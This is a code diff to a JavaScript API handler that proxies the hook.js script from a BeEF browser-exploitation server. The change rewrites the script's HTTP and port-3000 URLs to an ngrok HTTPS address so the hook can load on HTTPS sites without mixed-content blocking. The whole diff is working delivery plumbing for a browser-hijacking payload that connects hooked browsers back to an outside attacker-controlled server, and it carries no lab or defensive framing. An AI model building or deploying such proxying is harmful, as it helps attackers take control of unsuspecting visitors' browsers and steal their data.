@@ -49,9 +49,32 @@ export default async function handler(req, res) {
       return;
     }
 
-    const hookScript = await response.text();
+    let hookScript = await response.text();
 
-    // Return the hook.js content
+    // CRITICAL FIX: Replace all HTTP URLs with HTTPS to avoid mixed content errors
+    // BeEF hardcodes http:// in hook.js, but we need https:// for HTTPS sites
+    const httpUrl = beefServerUrl.replace("https://", "http://");
+
+    // Replace http://domain:3000 with https://domain (ngrok HTTPS doesn't need port)
+    hookScript = hookScript.replace(
+      new RegExp(
+        httpUrl.replace("http://", "http://").replace(/\//g, "\\/") + ":3000",
+        "g"
+      ),
+      beefServerUrl
+    );
+
+    // Also replace any plain http://domain references
+    hookScript = hookScript.replace(
+      new RegExp(httpUrl.replace(/\//g, "\\/"), "g"),
+      beefServerUrl
+    );
+
+    console.log(
+      `Proxied hook.js, replaced HTTP with HTTPS for: ${beefServerUrl}`
+    );
+
+    // Return the modified hook.js content
     res.status(200).send(hookScript);
   } catch (error) {
     console.error("Error fetching hook.js:", error.message);
